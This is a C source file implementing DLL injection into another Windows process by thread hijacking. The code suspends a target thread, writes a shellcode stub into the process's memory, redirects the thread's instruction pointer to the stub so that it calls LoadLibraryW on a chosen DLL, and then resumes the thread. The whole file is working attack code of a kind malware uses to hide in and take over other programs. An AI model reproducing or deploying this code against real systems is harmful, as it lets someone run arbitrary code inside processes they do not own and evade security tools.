#include "global.h"

#define MAX_CODE_SIZE 4096

BOOL makeThreadHijackingInjection(PWSTR hTargetProcess, PWSTR pwszDllName) {
	SIZE_T cbAllocationSize, cbBytesWritten;
	PWSTR pwszRemoteDllNameAddr;
	HANDLE hThreadSnap;
	THREADENTRY32 te;
	HANDLE hThread;
	LPVOID pLoadLibraryW;
	DWORD dwRes;
	CONTEXT context;
	DWORD64 rsp;
	CHAR* pchLoaderAsmCodeOriginal;
	DWORD dwLoaderAsmCodeOriginalLength;
	CHAR pchLoaderAsmCode[MAX_CODE_SIZE];
	DWORD dwOffsetCallParam;
	DWORD dwOffsetCallAddr;
	LPVOID pRemoteLoaderCode;

	hThread = NULL;

	if (!getLoadLibraryAddress(&pLoadLibraryW)) {
		return FALSE;
	}

	cbAllocationSize = (wcslen(pwszDllName) + 1) * sizeof(WCHAR);
	if (!allocateAndWriteRemoteProcess
	(hTargetProcess, pwszDllName, cbAllocationSize, &pwszRemoteDllNameAddr)) {
		return FALSE;
	}

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (INVALID_HANDLE_VALUE == hThreadSnap) {
		printf("CreateToolhelp32Snapshot failed. Error code %d\n", GetLastError());
		return FALSE;
	}
	te.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hThreadSnap, &te))
	{
		printf("Thread32First failed. Error code %d\n", GetLastError());
		CloseHandle(hThreadSnap);
		return FALSE;
	}

	do
	{
		if (te.th32OwnerProcessID == GetProcessId(hTargetProcess)) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			if (NULL == hThread) {
				printf("OpenThread failed. Error code %d\n", GetLastError());
				continue;
			}

			// We want to avoid already suspended thread. he won't run our injected dll.
			dwRes = SuspendThread(hThread);
			if (dwRes < 0) {
				printf("SuspendThread failed. Error code %d\n", GetLastError());
				return FALSE;
			}
			/*if (dwRes > 0) {
				ResumeThread(hThread);
				CloseHandle(hThread);
				hThread = NULL;
				continue;
			}*/
			break;
		}
	} while (Thread32Next(hThreadSnap, &te));

	CloseHandle(hThreadSnap);

	if (NULL == hThread) {
		printf("Couldn't find threads related to process or everyone are suspended.\n");
		return FALSE;
	}
	
	ZeroMemory(&context, sizeof(CONTEXT));
	context.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &context)) {
		printf("GetThreadContext failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}
	/*
		0:  9c                      pushf
		1 : 50                      push   rax
		2 : 53                      push   rbx
		3 : 51                      push   rcx
		4 : 52                      push   rdx
		5 : 57                      push   rdi
		6 : 56                      push   rsi
		7 : 41 50                   push   r8
		9 : 41 51                   push   r9
		b : 41 52                   push   r10
		d : 41 53                   push   r11
		f : 41 54                   push   r12
		11 : 41 55                   push   r13
		13 : 41 56                   push   r14
		15 : 41 57                   push   r15
		17 : 55                      push   rbp
		18 : 48 83 ec 28             sub    rsp, 0x28
		1c : 48 b9 11 11 22 22 33    movabs rcx, 0x4444333322221111
		23 : 33 44 44
		26 : 48 b8 55 55 66 66 77    movabs rax, 0x8888777766665555
		2d : 77 88 88
		30 : ff d0                   call   rax
		32 : 48 83 c4 28             add    rsp, 0x28
		36 : 5d                      pop    rbp
		37 : 41 5f                   pop    r15
		39 : 41 5e                   pop    r14
		3b : 41 5d                   pop    r13
		3d : 41 5c                   pop    r12
		3f : 41 5b                   pop    r11
		41 : 41 5a                   pop    r10
		43 : 41 59                   pop    r9
		45 : 41 58                   pop    r8
		47 : 5e                      pop    rsi
		48 : 5f                      pop    rdi
		49 : 5a                      pop    rdx
		4a : 59                      pop    rcx
		4b : 5b                      pop    rbx
		4c : 58                      pop    rax
		4d : 9d                      popf
		4e : c3                      ret
	*/
	dwOffsetCallParam = 0x1e;
	dwOffsetCallAddr = 0x28;
	pchLoaderAsmCodeOriginal = "\x9C\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x55\x48\x83\xEC\x28\x48\xB9\x11\x11\x22\x22\x33\x33\x44\x44\x48\xB8\x55\x55\x66\x66\x77\x77\x88\x88\xFF\xD0\x48\x83\xC4\x28\x5D\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5E\x5F\x5A\x59\x5B\x58\x9D\xC3";
	dwLoaderAsmCodeOriginalLength = 0x4f;
	memcpy_s(pchLoaderAsmCode, MAX_CODE_SIZE, pchLoaderAsmCodeOriginal, dwLoaderAsmCodeOriginalLength);

	// changing `mov rcx, ?` with dll path string which was allocated previously.
	memcpy_s(pchLoaderAsmCode + dwOffsetCallParam, 8, &pwszRemoteDllNameAddr, 8);

	// changing `mov rcx, ?` with LoadLibraryW address.
	memcpy_s(pchLoaderAsmCode + dwOffsetCallAddr, 8, &pLoadLibraryW, 8);
	
	// allocating loading code memory
	pRemoteLoaderCode = VirtualAllocEx(hTargetProcess, NULL, dwLoaderAsmCodeOriginalLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == pRemoteLoaderCode) {
		printf("VirtualAllocEx for loader shellcode failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	if (!WriteProcessMemory(hTargetProcess, pRemoteLoaderCode, pchLoaderAsmCode, dwLoaderAsmCodeOriginalLength, &cbBytesWritten)) {
		printf("WriteProcessMemory for loader shellcode failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	// writing parameter for LoadLibrary into the stack.
	//context.Rsp -= 8;
	//if (!WriteProcessMemory(hTargetProcess, context.Rsp, &pwszRemoteDllNameAddr, 8, &cbBytesWritten)) {
	//	printf("WriteProcessMemory failed. Error code %d\n", GetLastError());
	//	CloseHandle(hThread);
	//	return FALSE;
	//}
	//context.Rcx = pwszRemoteDllNameAddr;

	// writing return address to previous rip value into the stack.
	context.Rsp -= 8;
	if (!WriteProcessMemory(hTargetProcess, context.Rsp, &context.Rip, 8, &cbBytesWritten)) {
		printf("WriteProcessMemory failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	context.Rip = pRemoteLoaderCode;
	if (!SetThreadContext(hThread, &context)) {
		printf("SetThreadContext failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	if (!ResumeThread(hThread)) {
		printf("ResumeThread failed. Error code %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	CloseHandle(hThread);

	return TRUE;
}
